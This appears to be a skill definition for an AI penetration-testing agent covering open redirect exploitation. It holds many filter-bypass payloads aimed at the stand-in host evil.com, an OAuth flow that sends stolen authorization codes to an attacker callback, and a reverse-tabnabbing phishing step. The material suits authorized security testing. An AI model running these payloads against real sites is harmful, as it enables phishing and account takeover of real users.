---
name: open-redirect
description: "Open redirect exploitation for OAuth token theft, phishing, and filter bypass techniques"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, followRedirects, evaluateRendered, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["open redirect", "url redirect", "redirect vulnerability", "open url redirect", "redirect injection", "oauth redirect", "phishing redirect", "url validation bypass", "302 redirect", "location header redirect"]
contextBoosts: [auth]
mitreAttack: ["T1189", "T1566"]
owaspRefs: ["OWASP Top 10 A01:2021 Broken Access Control"]
---

# Open Redirect Exploitation

## When to Use

Use this skill when the target application:
- Accepts user-controlled URLs for server-side or client-side redirects
- Has OAuth/SAML flows with callback or redirect_uri parameters
- Implements login, logout, or post-action redirect logic using query parameters
- Uses JavaScript-based or meta-refresh redirect mechanisms
- Has URL validation that can be bypassed via encoding, path tricks, or DNS variations

## Do Not Use

- When the application does not accept external URLs for redirection
- When redirect targets are hardcoded with no user input
- When a WAF or CDN strictly validates redirect destinations server-side
- When testing would cause account lockout or data loss on production systems without authorization

## Auth Context

Open redirects are most dangerous when chained with authentication flows:
- **OAuth/SAML**: Steal authorization codes or tokens during the callback phase
- **Password reset**: Redirect the reset link to an attacker-controlled page
- **Post-login redirect**: Phish credentials immediately after legitimate authentication
- **SSO transitions**: Intercept tokens during identity provider handoffs

Require authenticated session context (`contextBoosts: [auth]`) for full impact exploitation.

## Detection

### Parameter Enumeration

Test every redirect parameter systematically. Common parameter names:

```
next, return, return_to, return_url, redirect, redirect_to, redirect_url,
continue, dest, destination, goto, go, out, rurl, url, uri, link,
next_url, next_page, returnto, redirect_uri, callback, returnTo,
forward, ref, referer, site, load, view, to, navigate, exit, leave
```

### Detection Method

1. **Inject external URL** into each parameter: `https://evil.com`
2. **Observe response**: Check for 3xx status + `Location` header pointing to attacker domain
3. **Check JavaScript redirects**: Look for `window.location`, `document.location`, `location.href` assignments in response body
4. **Check meta refresh**: Look for `<meta http-equiv="refresh" content="0;url=...">` tags
5. **Follow the redirect**: Confirm the browser actually navigates to the external domain

### Evidence to Record

- HTTP request with injected redirect URL
- Full response headers (especially `Location`)
- Response body if JavaScript or meta redirect is used
- Browser behavior after following the redirect chain

## Basic Exploitation

### Server-Side Redirect (HTTP 3xx)

```
GET /redirect?next=https://evil.com HTTP/1.1
Host: target.com
```

Expected response:
```
HTTP/1.1 302 Found
Location: https://evil.com
```

### Client-Side Redirect (JavaScript)

Response body contains:
```javascript
window.location.href = "https://evil.com";
// or
document.location = "https://evil.com";
// or
location.replace("https://evil.com");
```

### Meta Refresh Redirect

```html
<meta http-equiv="refresh" content="0;url=https://evil.com">
```

## Filter Bypass Techniques

### Protocol-Relative Redirect

If the application strips `https://` but not `//`:

```
?next=//evil.com
```

Browser resolves `//evil.com` as `https://evil.com`.

### Subdomain Impersonation

```
?next=https://evil.target.com
```

Some validations only check if the domain ends with `target.com`. Use attacker-controlled subdomain or DNS to resolve.

### Path Traversal with @ (Authority Confusion)

```
?next=https://target.com@evil.com
```

Parsed as: user `target.com`, host `evil.com`. Some URL parsers misinterpret this.

### Backslash Authority Confusion

```
?next=https://target.com\@evil.com
```

Some URL parsers treat backslash as a path separator, causing the authority to shift to `evil.com`.

### URL Encoding

Encode the `//` prefix to bypass string-based filters:

```
?next=/%2f%2fevil.com
?next=%2f%2fevil.com
?next=https://target.com/%2f%2fevil.com
```

### Double URL Encoding

Encode the `%` character itself:

```
?next=%252f%252fevil.com
?next=https://target.com/%252f%252fevil.com
```

### Backslash Path Traversal

```
?next=https://target.com\evil.com
```

On some systems, backslash is treated as a path separator, redirecting to `evil.com`.

### Null Byte Injection

```
?next=https://evil.com%00.target.com
?next=https://target.com%00evil.com
```

Older parsers may truncate at the null byte, treating the rest as invalid.

### DNS Name Variations

```
?next=https://evil.com#.target.com      (fragment bypass)
?next=https://evil.com?@target.com      (userinfo bypass)
?next=https://evil.com\@target.com      (backslash + @)
?next=https://evil.com%2523.target.com  (encoded fragment)
```

### Parameter Pollution

Send the same parameter twice with different values:

```
?next=target.com&next=evil.com
```

Server may use the first value for validation and the last for the redirect.

### Tab and Newline Characters

```
?next=https://evil.com%09.target.com
?next=https://evil.com%0a.target.com
```

Some parsers ignore whitespace characters in the URL.

### Unicode and Special Characters

```
?next=https://evil.com\u0040.target.com
?next=https://target.com。evil.com
```

Unicode normalization or homograph attacks can confuse domain validation.

## OAuth Token Theft

### Attack Flow

1. **Identify OAuth callback URL**: Find `redirect_uri`, `callback`, `return_to` in OAuth flow
2. **Craft malicious redirect**: Set `redirect_uri=https://evil.com/callback`
3. **Wait for victim**: Victim clicks crafted link, authenticates with OAuth provider
4. **Steal authorization code**: OAuth provider redirects to attacker domain with `?code=AUTHORIZATION_CODE`
5. **Exchange code for token**: Attacker exchanges stolen code for access token

### Exploitation Steps

```
# Step 1: Identify OAuth flow
GET /login?return_url=/dashboard
→ 302 → /oauth/authorize?redirect_uri=/callback

# Step 2: Inject attacker-controlled redirect_uri
GET /oauth/authorize?redirect_uri=https://evil.com/callback
→ User authenticates
→ 302 → https://evil.com/callback?code=STOLEN_CODE

# Step 3: Exchange code for token (server-side)
POST /oauth/token
{
  "grant_type": "authorization_code",
  "code": "STOLEN_CODE",
  "redirect_uri": "https://evil.com/callback",
  "client_id": "app_client_id"
}
```

### OAuth Provider Variations

- **Authorization Code Flow**: Steal `code` parameter from callback
- **Implicit Flow**: Steal `access_token` from URL fragment (`#access_token=...`)
- **PKCE Bypass**: If `code_verifier` is not bound to `code_challenge`, intercept and reuse

### Impact Amplification

- Chain with phishing: Redirect to login page clone, then steal tokens
- Chain with session fixation: Set session cookie before redirect, hijack after login
- Chain with SSRF: Use stolen token to access internal APIs

## Tabnabbing (Reverse Tabnabbing)

### Attack Mechanism

When a page opens a link with `target="_blank"` and `rel="opener"` (or no `rel`), the opened page can navigate the opener via `window.opener.location`.

### Exploitation

1. **Find outbound links** with `target="_blank"` and no `rel="noopener noreferrer"`
2. **Host attacker page** that performs: `window.opener.location = 'https://evil.com/phishing'`
3. **Victim clicks link** → attacker page loads → original tab silently redirects to phishing page

### Detection

Search response HTML for:
```html
<a href="..." target="_blank">
<a href="..." target="_blank" rel="opener">
<a href="..." target="_blank" rel="">
```

Missing `noopener` or `noreferrer` in `rel` attribute is vulnerable.

### Impact

Victim returns to the original tab expecting a legitimate site but sees a phishing clone. Particularly effective against:
- OAuth login pages
- Banking and email portals
- SSO authentication flows

## JavaScript-Based Redirects

### Common Patterns

```javascript
// Direct location assignment
window.location = url;
window.location.href = url;
window.location.assign(url);
window.location.replace(url);
document.location = url;
document.location.href = url;
document.location.assign(url);
document.location.replace(url);

// With user input
var redirect = getParameterByName('next');
window.location = redirect;

// Conditional redirect
if (validUrl(userInput)) {
    window.location = userInput;
}
```

### Meta Refresh

```html
<meta http-equiv="refresh" content="0;url=https://evil.com">
<meta http-equiv="refresh" content="1;url=https://evil.com">
```

### Evaluation in Sandboxed Contexts

Use `evaluateRendered` to observe actual browser behavior after JavaScript execution. Static HTML analysis alone may miss runtime redirects.

## Impact Documentation

### Severity Classification

- **High**: OAuth token theft, credential phishing via post-login redirect
- **Medium**: General phishing, session fixation chaining
- **Low**: Open redirect without authentication context (limited direct impact)

### Attack Scenarios to Document

1. **Credential Theft**: Phishing page captures username and password
2. **OAuth Abuse**: Stolen authorization code grants account access
3. **Malware Distribution**: Redirect to drive-by download page
4. **Session Hijacking**: Chain with session fixation for account takeover
5. **SSRF Chaining**: Redirect to internal network endpoints

### Proof of Concept Template

```
Endpoint: [FULL URL]
Parameter: [PARAMETER NAME]
Input: [ATTACK PAYLOAD]
Result: [HTTP RESPONSE + REDIRECT BEHAVIOR]
Impact: [WHAT THE ATTACKER GAINS]
```

## Anti-Hallucination

- **Verify every redirect**: Use `followRedirects` and confirm the browser navigates to the injected domain
- **Record HTTP evidence**: Capture full request/response including headers before claiming a redirect exists
- **Do not assume**: A parameter being present does not mean it is vulnerable — test with external URLs
- **Distinguish client vs server redirect**: Server-side (3xx headers) vs client-side (JavaScript/meta) have different exploitation paths
- **Check for DOM-based sinks**: Use `evaluateRendered` to confirm JavaScript actually executes the redirect
- **Do not fabricate bypass results**: If a filter blocks your payload, report it as filtered — do not claim success
- **Log failed attempts**: Record which bypasses were blocked to help refine the filter analysis
